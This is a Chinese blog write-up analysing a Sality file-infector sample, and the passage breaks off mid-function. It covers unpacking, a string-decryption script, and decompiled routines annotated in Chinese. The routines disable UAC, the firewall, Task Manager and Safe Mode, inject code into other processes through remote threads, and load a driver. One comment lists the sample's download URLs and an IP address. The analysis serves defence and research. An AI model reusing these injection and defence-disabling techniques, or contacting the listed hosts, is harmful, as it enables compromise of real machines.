---
title: Sality感染型样本流水账分析
description: ''
pubDate: 2024-10-24
lastModDate: ''
ogImage: true
toc: true
share: true
giscus: true
search: true
---

# 样本信息

File: e100c2c3f93cabf695256362e7de4443.exe
SHA1: b8b6dbf8974f55557715ce160cb89717c9d53d63
MD5: e100c2c3f93cabf695256362e7de4443

![image-20241021141001055](https://image-hosting-210.oss-cn-beijing.aliyuncs.com/blog/20260309194021653.png)

# 样本分析

## FSG脱壳

到达OEP入口

![image-20241021142437446](https://image-hosting-210.oss-cn-beijing.aliyuncs.com/blog/20260309194024657.png)

这里应该用剪切函数把无效的剪切掉

![image-20241021150251659](https://image-hosting-210.oss-cn-beijing.aliyuncs.com/blog/20260309194026721.png)

修正后的

```c
int __stdcall WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nShowCmd)
{
  int result; // eax
  CHAR Filename[260]; // [esp+0h] [ebp-104h] BYREF

  Decrypt((int)&unk_408030, 18);
  Decrypt((int)&byte_408044, 9);
  Decrypt((int)&byte_408050, 4);
  Decrypt((int)&unk_408058, 4);
  Decrypt((int)&Operation, 4);
  Decrypt((int)byte_408068, 29);
  GetModuleFileNameA(0, Filename, 0x104u);
  if ( Read_file(Filename) )//读文件
    sub_4014A0();//获取文件目录 确认文件版本 是对应版本就执行 不是就打开explorer 
  else
    sub_4015F0();//找资源 解密资源 执行
  result = SHGetSpecialFolderPathA(0, pszPath, 5, 0);
  if ( result )
  {
    strcat(pszPath, byte_408068);
    sub_4011A0(pszPath);//在对应目录创建文件夹
    sub_4017A0(&byte_408044);
    sub_4017A0(&byte_408050);
    sub_401BB0(&byte_408044);
    return 0;
  }
  return result;
}
```

 Decrypt 解密 Str1 = Str ^ 0xCD - 7

```c
int __cdecl Decrypt(int a1, int a2)
{
  int result; // eax

  for ( result = 0; result < a2; ++result )
    *(_BYTE *)(result + a1) = ((*(_BYTE *)(result + a1) - result) ^ 0xCD) - 7;
  return result;
}
```

解密脚本如下

```python
def decrypt(data):
    result = bytearray(data)
    length = len(result)
    
    for i in range(length):
        # 先进行解密操作
        decrypted_byte = ((result[i] - i) ^ 0xCD) - 7
        # 确保结果在0-255范围内
        result[i] = decrypted_byte % 256
        
    return result.decode('utf-8', errors='ignore')

# 新的加密数据
hex_data = "9F858FF4F8F6F6FA01C2C5BCC3AE06CDCBB4"
# 转换为字节
data = bytearray.fromhex(hex_data)

# 解密
decrypted_message = decrypt(data)
print(decrypted_message)
```

KB952567-mouse.log   为日志文件，会被删除
XP-Update     对应C:\XP-Update
msdn   对应C:\msdn
.exe   遍历的指定文件后缀名
Open   为ShellExecuteA参数，打开文件
\Visual Studio 2005\MSDEV\IDE    为在Document目录下创建的文件夹

资源段里有个pdf

![image-20241024153900980](https://image-hosting-210.oss-cn-beijing.aliyuncs.com/blog/20260309194031722.png)

这个pdf是受密码保护的 MD5：59892a9875d74dd93a7718cae6af65d0

![image-20241024154000313](https://image-hosting-210.oss-cn-beijing.aliyuncs.com/blog/20260309194033752.png)

在程序的末尾能找到另一个PE

![image-20241024154335299](https://image-hosting-210.oss-cn-beijing.aliyuncs.com/blog/20260309194037038.png)

## 衍生物分析

File: 1_2_5C602h_D9FEh.exe
SHA1: 0a673d011211740cbea63ff6620decefa349fd7e
MD5: 779be271957e3e6ff53502bd553755cd

![image-20241024164050356](https://image-hosting-210.oss-cn-beijing.aliyuncs.com/blog/20260309194039322.png)

### start

```c
void __noreturn start()
{
  ThreadId = 0;
  SetErrorMode(0x8002u);
  WSAStartup(2u, &WSAData);
  InitializeCriticalSection(&CriticalSection);
  InitializeCriticalSection(&stru_414018);//_RTL_CRITICAL_SECTION
  InitializeCriticalSection(&stru_414050);//_RTL_CRITICAL_SECTION
  sub_40E59D();***
  v0 = CreateThread(0, 0, sub_40D3E3***, 0, 0, &ThreadId);//第一个线程用于分配内存，创建虚拟内存映射并附加到当前地址空间，提升进程权限，注入特定进程。
  sub_4010E5(v0, 0, 0);
  v1 = CreateThread(0, 0, sub_40538E***, 0, 0, &ThreadId);//第二个线程用于删除注册表的子键路径，动态加载 ADVAPI32.DLL 、NTDLL.DLL 中的 API ，创建一个服务后，再创建一个线程来检测安全软件服务，接着打开名为 amsint32 的设备，再创建一个新线程用于扫描并检测安全软件进程。递归删除 HKEY_CURRENT_USER\System\CurrentControlSet\Control\SafeBoot 和 HKEY_LOCAL_MACHINE\System\CurrentControlSet\Control\SafeBoot 子键及其包含的所有键和值，修改或重置系统安全模式设置，如删除 HKEY_CURRENT_USER\SYSTEM\CurrentControlSet\Control\SafeBoot\Minimal\ ，会使用户无法进入安全模式。
  sub_4010E5(v1, 0, 0);
  v2 = CreateThread(0, 0, sub_40E3B4, 0, 0, &ThreadId);//第三个线程用于 autorun.inf 文件的创建写入，枚举指定注册表中特定文件，并感染相关文件
  sub_4010E5(v2, 0, 0);
  v3 = CreateThread(0, 0, sub_403F6C, 0, 0, &ThreadId);
  sub_4010E5(v3, 0, 0);
  v4 = CreateThread(0, 0, sub_405782, 0, 0, &ThreadId);
  sub_4010E5(v4, 0, 0);
  v15 = 0;
  v13 = 0;
  i = 0;
  LOWORD(v11) = 0;
  sub_40EED0***(v14);
  sub_40F600(1);
  v15 = (_DWORD *)sub_40F380(v14);
  if ( !*v15 )
  {
    memset(v8, 0, sizeof(v8));
    v9 = 0;
    v10 = 0;
    sub_407BB6(v8);
    for ( i = 0; i < 0x1770; i += 6 )
    {
      v13 = *(_DWORD *)&v8[i + 6520];
      LOWORD(v11) = *(_WORD *)&v8[i + 6524];
      if ( !v13 || !(_WORD)v11 )
        break;
      sub_40EF50(v13, (unsigned __int16)v11, 17001001, 1);
    }
    sub_40F600(0);
    sub_40F400(v14);
  }
  v5 = CreateThread(0, 0, sub_401189, 0, 0, &ThreadId);
  sub_4010E5(v5, 0, 0);
  v6 = CreateThread(0, 0, sub_4038BB, 0, 0, &ThreadId);
  sub_4010E5(v6, 0, 0);
  v7 = CreateThread(0, 0, sub_403D42, 0, 0, &ThreadId);
  sub_4010E5(v7, 0, 0);
  while ( 1 )
    Sleep(0x200u);
}
```

####   sub_40E59D();

```c
HGLOBAL sub_40E59D()
{
sub_40DACB()***;
  hModule = LoadLibraryA(MPR);
  if ( hModule )
  {
    dword_4140BC = (int)GetProcAddress(hModule, WNetEnumResourceA);
    dword_4140B4 = (int)GetProcAddress(hModule, WNetOpenEnumA);
    dword_414010 = (int)GetProcAddress(hModule, WNetCloseEnum);
  }
  LibraryA = LoadLibraryA(WININET.DLL);
  if ( LibraryA )
  {
    dword_41406C = (int)GetProcAddress(LibraryA, InternetCloseHandle);
    dword_41400C = (int)GetProcAddress(LibraryA, InternetReadFile);
    dword_4140A0 = (int)GetProcAddress(LibraryA, InternetOpenUrlA);
    dword_4140A8 = (int)GetProcAddress(LibraryA, InternetOpenA);
  }
  if ( !RegOpenKeyExA(HKEY_CURRENT_USER,'Software\Microsoft\Windows\CurrentVersion\Internet Settings', 0, 0xF003Fu, &phkResult) )
  {
    *(_DWORD *)Data = 0;
    RegSetValueExA(phkResult, GlobalUserOffline, 0, 4u, Data, 4u);//禁用脱机工作模式,允许脱机
    RegCloseKey(phkResult);
  }
  if ( !RegOpenKeyExA(HKEY_LOCAL_MACHINE,'Software\Microsoft\Windows\CurrentVersion\policies\system', 0, 0xF003Fu, &phkResult) )
  {
    *(_DWORD *)Data = 0;
    RegSetValueExA(phkResult, EnableLUA, 0, 4u, Data, 4u);//禁用用户账户控制(UAC)
    RegCloseKey(phkResult);
  }
  lstrcpyA(String1,'SYSTEM\CurrentControlSet\Services\SharedAccess\Parameters\Firewal');
  lstrcatA(String1,'\AuthorizedApplications\List');
  if ( !RegOpenKeyExA(HKEY_LOCAL_MACHINE, String1, 0, 0xF003Fu, &phkResult) )
  {//创建一个防火墙规则，允许当前可执行文件通过防火墙访问网络
    GetModuleFileNameA(0, Filename, 0x200u);
    wsprintfA(String1,'%s:*:Enabled:ipsec', Filename);
    v0 = lstrlenA(String1);
    RegSetValueExA(phkResult, Filename, 0, 1u, (const BYTE *)String1, v0);
    RegCloseKey(phkResult);
  }
  if ( !RegOpenKeyExA(HKEY_LOCAL_MACHINE,'SYSTEM\CurrentControlSet\Services\SharedAccess\Parameters\Firewal', 0, 0xF003Fu, &phkResult) )
  {
    *(_DWORD *)Data = 0;
    RegSetValueExA(phkResult, EnableFirewall, 0, 4u, Data, 4u);//关闭防火墙
    *(_DWORD *)Data = 0;
    RegSetValueExA(phkResult, DoNotAllowExceptions, 0, 4u, Data, 4u);//允许指定程序进行网络连接（添加防火墙白名单）
    *(_DWORD *)Data = 1;
    RegSetValueExA(phkResult, DisableNotifications, 0, 4u, Data, 4u);//禁用防火墙通知
    RegCloseKey(phkResult);
  }
  *(_DWORD *)Data = 128;
  GetComputerNameA(String1, (LPDWORD)Data);//获取计算机名称
  if ( lstrlenA(String1) > 2 )
  {
    v6 = String1[0];
    hostshort = (unsigned __int8)String1[lstrlenA(String1) - 1] * v6 + 2199;
  }
  hFileMappingObject = CreateFileMappingA((HANDLE)0xFFFFFFFF, 0, 4u, 0, 0x15400u, 'purity_control_90833');//创建内存映射文件对象，便于不同进程之间通过该名称共享内存映射文件对象
  sub_401446();
  sub_401B10***(&dword_475C58);
  if ( !lstrlenA(&::String) )
    sub_4059C2();***
  v9 = 0;
  v11 = 0;
  v10 = 0;
  memset(String, 0, sizeof(String));
  v13 = 0;
  v14 = 0;
  if ( ::String < '0' || ::String > '9' )
  {
    v4 = (unsigned __int16)sub_4013EA() % 1000;
    TickCount = GetTickCount();
    wsprintfA(&::String, "%d%d", TickCount, v4);
  }
  do
  {
    if ( *(&::String + v11) < '0' || *(&::String + v11) > '9' || !*(&::String + v11) )
      break;
    v10 = *(&::String + v11) + byte_478205[v11] + 4;
    v5 = v10 % 0x61 > 0x1A ? 110 : v10;
    v2 = lstrlenA(String);
    wsprintfA(&String[v2], "%c", v5);
    v11 += 2;
  }
  while ( v11 != '\f' );
  lstrcatA(String, "GetSystemDirectoryA.sys");
  GetSystemDirectoryA(FileName, 0x80u);
  if ( byte_4760FF[lstrlenA(FileName)] != '\\' )
    lstrcatA(FileName, '\');
  lstrcatA(FileName, 'drivers\');
  lstrcatA(FileName, String);
  GetWindowsDirectoryA(sz, 0x104u);
  CharLowerA(sz);
  dword_41409C = (int)GlobalAlloc(0x40u, 0x21000u);
  result = GlobalAlloc(0x40u, 0x21000u);
  dword_414004 = (int)result;
  return result;
}
```

##### sub_40DACB(); 隐藏已知文件拓展名，禁用任务管理器，禁用注册表编辑器

```c++
LPSTR sub_40DACB()
{
  if ( !RegOpenKeyExA(HKEY_CURRENT_USER, lpSubKey, 0, 0xF003Fu, &phkResult) )
  {
    *(_DWORD *)Data = 2;
    RegSetValueExA(phkResult, Hidden, 0, 4u, Data, 4u);//隐藏已知文件拓展名
    RegCloseKey(phkResult);
  } 			 	sub_40DA41(HKEY_CURRENT_USER,'Software\Microsoft\Windows\CurrentVersion\policies\system', DisableTaskMgr);//禁用任务管理器
 sub_40DA41(HKEY_CURRENT_USER,'Software\Microsoft\Windows\CurrentVersion\policies\system', DisableRegistryTools);//禁用注册表编辑器
  for ( *(_DWORD *)Data = '8'; *(_DWORD *)Data != '>'; ++*(_DWORD *)Data )
    sub_40DA41(HKEY_LOCAL_MACHINE, 'SOFTWARE\Microsoft\Security Center', (&"_kkiuynbvnbrev406")[*(_DWORD *)Data]);
  lstrcpyA(String1, off_48155C);
  result = lstrcatA(String1, "\\Svc");
  for ( *(_DWORD *)Data = '8'; *(_DWORD *)Data != '>'; ++*(_DWORD *)Data )
  {//设置子键 _kkiuynbvnbrev406
    sub_40DA41(HKEY_LOCAL_MACHINE, String1, (&"_kkiuynbvnbrev406")[*(_DWORD *)Data]);
    result = (LPSTR)(*(_DWORD *)Data + 1);
  }
  return result;
}
```

##### sub_401B10复制指定数据到内存

根据当前用户和其计算机信息生成一个由 Software\用户名\计算结果 组成注册表键，并读写一些值，当满足特定条件时，将内存映射文件中的对应满足条件的数据，复制到指针 a1 所指向的内存块中

```c++
__int16 __cdecl sub_401B10(int a1)
{
  memset(String1, 0, 261);
  memset(Buffer, 0, sizeof(Buffer));
  pcbBuffer = 128;
  *(_DWORD *)Data = 0;
  cbData = 0;
  phkResult = 0;
  memset(v19, 0, sizeof(v19));
  LOWORD(v1) = 0;
  if ( !a1 )
    return v1;
  lstrcpyA(String1,'Software\');
  GetUserNameA(Buffer, &pcbBuffer);
  sub_412B8B(&v14, Buffer, 4);
  if ( lstrlenA(Buffer) < 2 )
    lstrcatA(Buffer, monga_bonga);
  for ( pcbBuffer = 0; ; ++pcbBuffer )
  {
    v2 = lstrlenA(Buffer);
    if ( pcbBuffer >= v2 )
      break;
    v3 = pcbBuffer * Buffer[pcbBuffer] % 0x19 + (pcbBuffer != 0 ? 97 : 65);
    String1[lstrlenA(String1)] = v3;
  }
  v9 = (unsigned __int8)v14 * v14;
  v4 = lstrlenA(String1);
  wsprintfA(&String1[v4], "\\%d", v9);
  v1 = RegOpenKeyExA(HKEY_CURRENT_USER, String1, 0, 0xF003Fu, &phkResult);
  if ( v1 )
  {
    v1 = RegCreateKeyA(HKEY_CURRENT_USER, String1, &phkResult);
    if ( v1 )
      return v1;
    goto LABEL_9;
  }
  for ( pcbBuffer = 1; pcbBuffer < 8; ++pcbBuffer )
  {
    wsprintfA(String1, "%d", pcbBuffer * v14);
    if ( pcbBuffer > 5 )
    {
      cbData = 1024;
      Buffer[0] = 0;
      if ( RegQueryValueExA(phkResult, String1, 0, 0, (LPBYTE)Buffer, &cbData) )
        goto LABEL_9;
    }
    else
    {
      cbData = 4;
      if ( RegQueryValueExA(phkResult, String1, 0, 0, Data, &cbData) )
        goto LABEL_9;
    }
    LOWORD(v1) = pcbBuffer;
    switch ( pcbBuffer )
    {
      case 1u:
        LOWORD(v1) = *(_WORD *)Data;
        v19[0] = *(_DWORD *)Data;
        break;
      case 2u:
        LOBYTE(v19[1]) = Data[0];
        break;
      case 3u:
        BYTE1(v19[1]) = Data[0];
        break;
      case 4u:
        LOWORD(v1) = *(_WORD *)Data;
        HIWORD(v19[1]) = *(_WORD *)Data;
        break;
      case 5u:
        v19[2] = *(_DWORD *)Data;
        break;
      case 6u:
        LOWORD(v1) = sub_40169D(Buffer, cbData, &v19[3]);//检验数据是否合法
        break;
      case 7u:
        LOWORD(v1) = sub_40169D(Buffer, cbData, &v19[259]);
        break;
      default:
        continue;
    }
  }
  if ( v19[0] )
  {
    pcbBuffer = 0;
    sub_412B8B(Buffer, &v19[259], 128);//将对应数据赋值到另一个内存块内
    pcbBuffer += 128;
    sub_412B8B(&Buffer[pcbBuffer], v19, 4);
    pcbBuffer += 4;
    Buffer[pcbBuffer++] = v19[1];
    Buffer[pcbBuffer++] = BYTE1(v19[1]);
    sub_412B8B(&Buffer[pcbBuffer++], (char *)&v19[1] + 2, 2);
    sub_412B8B(&Buffer[++pcbBuffer], &v19[2], 4);
    pcbBuffer += 4;
    sub_412B8B(&Buffer[pcbBuffer], &v19[3], v19[2]);
    pcbBuffer += v19[2];
    if ( !sub_402341(Buffer) )
    {
LABEL_9:
      hMem = (char *)GlobalAlloc(0x40u, 0x11400u);
      v1 = sub_407BB6(hMem);
      if ( v1 )
        LOWORD(v1) = sub_402341(hMem + 12524);
      if ( !dword_475C58 )
      {
        for ( pcbBuffer = 1; pcbBuffer < 8; ++pcbBuffer )
        {
          wsprintfA(String1, "%d", pcbBuffer * v14);
          switch ( pcbBuffer )
          {
            case 1u:
              *(_DWORD *)Data = 1;
              break;
            case 2u:
              *(_DWORD *)Data = 0;
              break;
            case 3u:
              *(_DWORD *)Data = 0;
              break;
            case 4u:
              *(_DWORD *)Data = 30;
              break;
            case 5u:
              *(_DWORD *)Data = 143;
              break;
            case 6u:
              v5 = (const CHAR *)sub_4016FF(&unk_482028, 142);
              lstrcpyA(Buffer, v5);
              break;
            case 7u:
              v6 = (const CHAR *)sub_4016FF(&unk_481FA4, 129);
              lstrcpyA(Buffer, v6);
              break;
            default:
              break;
          }
          if ( pcbBuffer > 5 )
          {
            v7 = lstrlenA(Buffer);
            RegSetValueExA(phkResult, String1, 0, 1u, (const BYTE *)Buffer, v7);
          }
          else
          {
            RegSetValueExA(phkResult, String1, 0, 4u, Data, 4u);
          }
        }
        RegCloseKey(phkResult);
        *(_DWORD *)a1 = 1;
        *(_BYTE *)(a1 + 4) = 0;
        *(_BYTE *)(a1 + 5) = 0;
        *(_WORD *)(a1 + 6) = 30;
        *(_DWORD *)(a1 + 8) = 143;
        sub_412B8B(a1 + 12, &unk_482028, 143);//http://89.119.67.154/testo5/、http://kukutrustnet777.info/home.gif、http://kukutrustnet888.info/home.gif、http://kukutrustnet987.info/home.gif
        LOWORD(v1) = sub_412B8B(a1 + 1036, &unk_481FA4, 130);//
      }
      if ( hMem )
        LOWORD(v1) = (unsigned __int16)GlobalFree(hMem);
      return v1;
    }
    LOWORD(v1) = sub_412B8B(&dword_475C58, v19, 1164);
  }
  if ( phkResult )
    LOWORD(v1) = RegCloseKey(phkResult);
  return v1;
}
```

##### sub_4059C2 从SYSTEM.INI文件中读取指定区域和键的字符串值，再把随机字符串写回文件中

```c++
sub_4059C2()
{
  memset(v7, 0, sizeof(v7));
  memset(ReturnedString, 0, sizeof(ReturnedString));
  Target = GetTickCount();//获取系统启动后的毫秒数
  GetPrivateProfileStringA('MCIDRV_VER', 'DEVICEMB', 0, ReturnedString, 0x80u, 'SYSTEM.INI');//从SYSTEM.INI文件中读取指定区域和键的字符串值
  if ( !lstrlenA(ReturnedString) )
  {
    dword_4140CC = 1;
    TickCount = GetTickCount();
    v0 = sub_4013EA();//生成随机数
    wsprintfA(ReturnedString, '%d%d', TickCount, v0 % 10000);
    WritePrivateProfileStringA('MCIDRV_VER', 'DEVICEMB', ReturnedString, 'SYSTEM.INI');
  }//把随机字符串写回SYSTEM.INI文件中
  return lstrcpyA(&String, ReturnedString);
}
```

#### sub_40D3E3 用于分配内存，创建虚拟内存映射并附加到当前地址空间，提升进程权限，注入特定进程

```c++
void __stdcall __noreturn sub_40D3E3(LPVOID lpThreadParameter)
{
  hMem = GlobalAlloc(0x40u, 0x15000u);
  if ( sub_407BB6((int)hMem) )//检测内存分配
    sub_412B8B(dword_47B1D0, hMem, 0x2000);
  GlobalFree(hMem);
  byte_47C943 = 0;
  if ( dword_47B1D0[0]
    && sub_40D38E(dword_47B1D0, '""""', (char)LoadLibraryExA)
    && sub_40D38E(dword_47B1D0, '3333', (char)GetProcAddress) )
  {
    sub_412B8B(byte_47E1D0, byte_4856CC, '0');
    sub_40D38E(byte_47E1D0, '""""', (char)CreateMutexA);
    sub_40D38E(byte_47E1D0, '3333', (char)Sleep);
    while ( 1 )
    {
      sub_40D123()***;//提权，注入
      Sleep(0x2800u);
    }
  }
  ExitThread(0);
}
```

##### sub_40D123 遍历进程 提权注入

```c++
BOOL sub_40D123()
{
  memset(String1, 0, sizeof(String1));
  hSnapshot = CreateToolhelp32Snapshot(2u, 0);
  if ( hSnapshot )//遍历进程
  {
    pe.dwSize = 296;
    memset(&pe.cntUsage, 0, 0x124u);
    if ( Process32First(hSnapshot, &pe) && pe.th32ProcessID > 0xA )
    {
      if ( lstrlenA(pe.szExeFile) <= 64 )
        lstrcpyA(String1, pe.szExeFile);
      else
        lstrcpynA(String1, pe.szExeFile, 64);
      CharLowerA(String1);
      th32ProcessID = pe.th32ProcessID;
      v0 = lstrlenA(String1);
      wsprintfA(&String1[v0], "M_%d_", th32ProcessID);
      hMutex = CreateMutexA(0, 0, String1);//创建互斥锁th32ProcessID
      LastError = GetLastError();
      ReleaseMutex(hMutex);
      CloseHandle(hMutex);
      if ( !LastError )
        sub_40CB05***(pe.th32ProcessID, String1);//提权注入
    }
    while ( Process32Next(hSnapshot, &pe) )
    {
      if ( pe.th32ProcessID > 0xA )
      {
        if ( lstrlenA(pe.szExeFile) <= 64 )
          lstrcpyA(String1, pe.szExeFile);
        else
          lstrcpynA(String1, pe.szExeFile, 64);
        CharLowerA(String1);
        v4 = pe.th32ProcessID;
        v1 = lstrlenA(String1);
        wsprintfA(&String1[v1], "M_%d_", v4);
        hObject = CreateMutexA(0, 0, String1);
        LastError = GetLastError();
        ReleaseMutex(hObject);
        CloseHandle(hObject);
        if ( !LastError )
          sub_40CB05(pe.th32ProcessID, String1);
      }
    }
  }
  return CloseHandle(hSnapshot);
}
```

###### sub_40CB05  提权注入

```c++
int __cdecl sub_40CB05(DWORD dwProcessId, CHAR *lpName)
{
  v2 = alloca(4848);
  ms_exc.old_esp = (DWORD)&v12;
  memset(Buffer, 0, sizeof(Buffer));
  memset(Name, 0, sizeof(Name));
  memset(ReferencedDomainName, 0, sizeof(ReferencedDomainName));
  ProcessHandle = OpenProcess(0x1F0FFFu, 0, dwProcessId);
  if ( !ProcessHandle )
  {
    if ( GetLastError() != 5 )
    {
      ms_exc.registration.TryLevel = -1;
      goto LABEL_49;
    }
    memset(&VersionInformation.dwMajorVersion, 0, 0x90u);
    VersionInformation.dwOSVersionInfoSize = 148;
    GetVersionExA(&VersionInformation);
    if ( VersionInformation.dwPlatformId != 2 )
    {
      ms_exc.registration.TryLevel = -1;
      goto LABEL_49;
    }
    ReturnLength = 16;
    CurrentThread = GetCurrentThread();
    //提权，使进程具有 RWX 权限
    if ( !OpenThreadToken(CurrentThread, 0x28u, 0, &TokenHandle) )
    {
      if ( GetLastError() != 1008 )
      {
        ms_exc.registration.TryLevel = -1;
        goto LABEL_49;
      }
      CurrentProcess = GetCurrentProcess();
      if ( !OpenProcessToken(CurrentProcess, 0x28u, &TokenHandle) )
      {
        ms_exc.registration.TryLevel = -1;
        goto LABEL_49;
      }
    }
    NewState.PrivilegeCount = 1;
    NewState.Privileges[0].Attributes = 2;
    LookupPrivilegeValueA(0, ::Name, &NewState.Privileges[0].Luid);
    if ( !AdjustTokenPrivileges(TokenHandle, 0, &NewState, 0x10u, &PreviousState, &ReturnLength)|| GetLastError() == 1300 )
    {
      CloseHandle(TokenHandle);
      ms_exc.registration.TryLevel = -1;
      goto LABEL_49;
    }
    ProcessHandle = OpenProcess(0x1F0FFFu, 0, dwProcessId);
    AdjustTokenPrivileges(TokenHandle, 0, &PreviousState, 0x10u, 0, 0);
    CloseHandle(TokenHandle);
    if ( !ProcessHandle )
    {
      ms_exc.registration.TryLevel = -1;
      goto LABEL_49;
    }
  }
  if ( !OpenProcessToken(ProcessHandle, 8u, &hObject) )
  {
    ms_exc.registration.TryLevel = -1;
    goto LABEL_49;
  }
  if ( GetTokenInformation(hObject, TokenUser, 0, 0, &dwBytes) )
  {
    ms_exc.registration.TryLevel = -1;
    goto LABEL_49;
  }
  if ( GetLastError() != 122 )
  {
    ms_exc.registration.TryLevel = -1;
    goto LABEL_49;
  }
  v10 = dwBytes;
  ProcessHeap = GetProcessHeap();
  TokenInformation = HeapAlloc(ProcessHeap, 0, v10);
  if ( !TokenInformation )
  {
    ms_exc.registration.TryLevel = -1;
    goto LABEL_49;
  }
  if ( !GetTokenInformation(hObject, TokenUser, TokenInformation, dwBytes, &dwBytes) )
  {
    ms_exc.registration.TryLevel = -1;
    goto LABEL_49;
  }
  cchReferencedDomainName = 80;
  cchName = 80;
  if ( !LookupAccountSidA(//查询用户SID信息、SID所对应的用户或组名
          0,
          *(PSID *)TokenInformation,
          Name,
          &cchName,
          ReferencedDomainName,
          &cchReferencedDomainName,
          peUse) )
  {
    ms_exc.registration.TryLevel = -1;
    goto LABEL_49;
  }
  if ( !Name[0] )
  {
    ms_exc.registration.TryLevel = -1;
    goto LABEL_49;
  }
  if ( !lstrcmpiA(Name, aSystem) || !lstrcmpiA(Name, aLocalService) || !lstrcmpiA(Name, aNetworkService) )//对于用户不属于system、local service、network service的进程,执行远程线程注入
  {
    CreateMutexA(0, 0, lpName);
    ms_exc.registration.TryLevel = -1;
    goto LABEL_49;
  }
  v6 = VirtualAllocEx(ProcessHandle, 0, 0x2000u, 0x3000u, 0x40u);//在目标进程中申请内存，将要执行的代码写入该内存中
  lpBaseAddress = v6;
  if ( v6 )
  {
    if ( !WriteProcessMemory(ProcessHandle, lpBaseAddress, dword_47B1D0, 0x2000u, &cchName) )
    {
      ms_exc.registration.TryLevel = -1;
      goto LABEL_49;
    }
    if ( !CreateRemoteThread(ProcessHandle, 0, 0, (LPTHREAD_START_ROUTINE)lpBaseAddress, 0, 0, 0) )//创建一个远程线程，并指定线程函数为该申请到的内存地址
    {
      ms_exc.registration.TryLevel = -1;
      goto LABEL_49;
    }
    v35 = 1;
  }
  lpBaseAddress = VirtualAllocEx(ProcessHandle, 0, 0x1000u, 0x3000u, 0x40u);
  if ( lpBaseAddress )
  {
    sub_412B8B(Buffer, byte_47E1D0, 48);
    v7 = lstrlenA(lpName);
    sub_412B8B(&Buffer[47], lpName, v7);
    if ( !WriteProcessMemory(ProcessHandle, lpBaseAddress, Buffer, 0x1000u, &cchName) )//将需要的参数写入该内存地址
    {
      ms_exc.registration.TryLevel = -1;
      goto LABEL_49;
    }
    if ( !CreateRemoteThread(ProcessHandle, 0, 0, (LPTHREAD_START_ROUTINE)lpBaseAddress, 0, 0, 0) )
    {
      ms_exc.registration.TryLevel = -1;
      goto LABEL_49;
    }
    v35 = 1;
  }
  ms_exc.registration.TryLevel = -1;
LABEL_49:
  if ( ProcessHandle )
  {
    CloseHandle(ProcessHandle);
    ProcessHandle = 0;
  }
  if ( hObject )
    CloseHandle(hObject);
  if ( TokenInformation )
  {
    v11 = TokenInformation;
    v8 = GetProcessHeap();
    HeapFree(v8, 0, v11);
  }
  return v35;
}
```

#### sub_40538E

删除注册表的子键路径，动态加载 ADVAPI32.DLL 、NTDLL.DLL 中的 API ，检测安全软件，打开名为 amsint32 的设备，创建新线程用于扫描并检测安全软件进程。修改或重置系统安全模式设置，使用户无法进入安全模式。

```c++
void __stdcall __noreturn sub_40538E(LPVOID lpThreadParameter)
{
  if ( dword_4140CC )
    Sleep(0x493E0u);
  else
    Sleep(0x1000u);
  //删除注册表的子键及其包含的所有键和值
  sub_4043C4('System\CurrentControlSet\Control\SafeBoot', HKEY_CURRENT_USER);
  sub_4043C4('System\CurrentControlSet\Control\SafeBoot', HKEY_LOCAL_MACHINE);
  hModule = LoadLibraryA("ADVAPI32.DLL");//动态加载API 
  if ( hModule )
  {
    v12 = CreateServiceA;
    if (GetProcAddress(hModule))
    {
      v11 = OpenSCManagerA;
      if (GetProcAddress(hModule))
      {
        v10 = OpenServiceA;
        if (GetProcAddress(hModule))
        {
          v9 = CloseServiceHandle;
          if (GetProcAddress(hModule))
          {
            v8 = DeleteService;
            if (GetProcAddress(hModule))
            {
              v7 = ControlService;
              if (GetProcAddress(hModule))
              {
                v6 = StartServiceA;
                if (GetProcAddress(hModule))
                {
                  v5 = ChangeServiceConfigA;
                  if (GetProcAddress(hModule))
                  {
                    sub_404797(v5, v6, v7, v8, v9, v10, v11, v12, 0);//加载驱动 C:\Windows\system32\drivers\ipfltdrv.sys以服务形式启动
                    v1 = CreateThread(0, 0, sub_4048AE, 0, 0, &ThreadId);//检测杀软
                    sub_4010E5(v1, 0, 0);//临界区检验
                    LibraryA = LoadLibraryA("NTDLL.DLL");//动态加载API 
                    if ( LibraryA )
                    {
                      v3 = NtQuerySystemInformation;
                      dword_414008 = (int)GetProcAddress(LibraryA);
                      if ( dword_414008 )
                      {
                        if ( !sub_404621(v3) )//打开设备"\\\\.\\amsint32"
                        {
                          sub_40456D();//修改或重置系统安全模式
                          sub_4046E7("amsint32", String1);
                        }
                        if ( sub_404621(v4) )//打开设备"\\\\.\\amsint32"
                        {
                          if ( sub_404BAA***() )//为驱动注入(xp系统下),注入一段代码到 amsint32 设备中
                          {
                            v2 = CreateThread(0, 0, sub_405362, 0, 0, &ThreadId);//检测杀软
                            sub_4010E5(v2, 0, 0);//检测临界
                          }
                        }
                      }
                    }
                  }
                }
              }
            }
          }
        }
      }
    }
  }
  ExitThread(0);
}
```

###### sub_404BAA

```c++
int sub_404BAA()
{//清空字符数组
  memset(Buffer, 0, sizeof(Buffer));
  memset(NewFileName, 0, sizeof(NewFileName));
  hModule = 0;
  hMem = &hMem;
  v6 = 0;
  GetSystemDirectoryA(Buffer, 0xF8u);//获取系统目录，并检查路径后是否有\，若没有则在其后面添加\
  if ( Buffer[lstrlenA(Buffer) - 1] != '\\' )
    lstrcatA(Buffer, '\');
//获取系统信息，查询系统中所有模块的基址和大小等信息，并保存在内存块 hMem 中
  v21 = dword_414008(11, hMem, 4, &dwBytes);
  if ( v21 != 0xC0000004 )
    return 0;
  hMem = GlobalAlloc(0x40u, dwBytes);
  v21 = dword_414008(11, hMem, dwBytes, 0);
  if ( v21 < 0 )
    return 0;
  v22 = *((_DWORD *)hMem + 3);
  //从内存块 hMem 中取得指向第n个模块的指针，并将其所在库文件名存储在字符数组lpLibFileName中
  lpLibFileName = (char *)hMem + *((unsigned __int16 *)hMem + 15) + ' ';
  lstrcatA(Buffer, lpLibFileName);
  sub_405BC9(NewFileName);//生成随机一个文件名NewFileName,文件名格式为"%s.exe"或"win%s.exe"
  if ( CopyFileA(Buffer, NewFileName, 0) )//拷贝系统目录Buffer中的驱动程序到新文件 NewFileName
    hModule = LoadLibraryExA(NewFileName, 0, 1u);//加载该文件
  if ( !hModule )
  {
    hModule = LoadLibraryExA(lpLibFileName, 0, 1u);
    if ( !hModule )
      return 0;
  }
  GlobalFree(hMem);//释放内存块
  ProcAddress = GetProcAddress(hModule);
  if ( !ProcAddress )
    return 0;
  ProcAddress = (FARPROC)((char *)ProcAddress - (int)hModule);
  v1 = sub_404A42(hModule, ProcAddress);//检测驱动程序是否为 PE 格式，若不是则返回 0
  if ( !v1 )
